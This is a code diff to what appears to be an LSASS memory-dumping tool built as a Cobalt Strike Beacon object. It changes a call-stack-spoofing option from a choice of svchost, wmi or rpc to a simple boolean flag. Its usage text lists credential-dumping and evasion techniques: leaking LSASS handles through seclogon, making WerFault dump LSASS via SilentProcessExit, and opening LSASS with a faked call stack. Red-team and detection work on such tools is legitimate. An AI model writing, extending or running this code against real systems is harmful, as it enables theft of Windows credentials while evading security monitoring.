@@ -33,7 +33,7 @@ void go(char* args, int length)
     BOOL           use_silent_process_exit;
     LPCSTR         silent_process_exit;
     BOOL           use_lsass_shtinkering;
-    DWORD          spoof_callstack;
+    BOOL           spoof_callstack;
     PPROCESS_LIST  created_processes = NULL;
     HANDLE         hSnapshot = NULL;
     WCHAR          wcFilePath[MAX_PATH];
@@ -65,7 +65,7 @@ void go(char* args, int length)
     use_seclogon_leak_remote = (BOOL)BeaconDataInt(&parser);
     seclogon_leak_remote_binary = BeaconDataExtract(&parser, NULL);
     use_seclogon_duplicate = (BOOL)BeaconDataInt(&parser);
-    spoof_callstack = BeaconDataInt(&parser);
+    spoof_callstack = (BOOL)BeaconDataInt(&parser);
     use_silent_process_exit = (BOOL)BeaconDataInt(&parser);
     silent_process_exit = BeaconDataExtract(&parser, NULL);
     use_lsass_shtinkering = (BOOL)BeaconDataInt(&parser);
@@ -280,10 +280,8 @@ void usage(char* procname)
     PRINT("            leak an " LSASS " handle into another process via seclogon and duplicate it");
     PRINT("    --seclogon-duplicate, -sd");
     PRINT("            make seclogon open a handle to " LSASS " and duplicate it");
-#ifdef _WIN64
-    PRINT("    --spoof-callstack {svchost,wmi,rpc}, -sc {svchost,wmi,rpc}");
+    PRINT("    --spoof-callstack, -sc");
     PRINT("            open a handle to " LSASS " using a fake calling stack");
-#endif
     PRINT("Let WerFault.exe (instead of nanodump) create the dump");
     PRINT("    --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER");
     PRINT("            force WerFault.exe to dump " LSASS " via SilentProcessExit");
@@ -326,7 +324,7 @@ int main(int argc, char* argv[])
     LPCSTR         seclogon_leak_remote_binary    = NULL;
     BOOL           use_seclogon_duplicate         = FALSE;
     BOOL           use_lsass_shtinkering          = FALSE;
-    DWORD          spoof_callstack                = 0;
+    BOOL           spoof_callstack                = FALSE;
     HANDLE         hSnapshot                      = NULL;
     PPROCESS_LIST  created_processes              = NULL;
     BOOL           ret_val                        = FALSE;
@@ -498,35 +496,11 @@ int main(int argc, char* argv[])
             do_synchronize = TRUE;
             get_full_path(&synchronization_file, argv[++i]);
         }
-#ifdef _WIN64
         else if (!strncmp(argv[i], "-sc", 4) ||
                  !strncmp(argv[i], "--spoof-callstack", 18))
         {
-            if (i + 1 >= argc)
-            {
-                PRINT("missing --spoof-callstack value");
-                return 0;
-            }
-            i++;
-            if (!strncmp(argv[i], "svchost", 8))
-            {
-                spoof_callstack = SVC_STACK;
-            }
-            else if (!strncmp(argv[i], "wmi", 4))
-            {
-                spoof_callstack = WMI_STACK;
-            }
-            else if (!strncmp(argv[i], "rpc", 4))
-            {
-                spoof_callstack = RPC_STACK;
-            }
-            else
-            {
-                PRINT("invalid --spoof-callstack value");
-                return 0;
-            }
+            spoof_callstack = TRUE;
         }
-#endif
         else if (!strncmp(argv[i], "-h", 3) ||
                  !strncmp(argv[i], "--help", 7))
         {
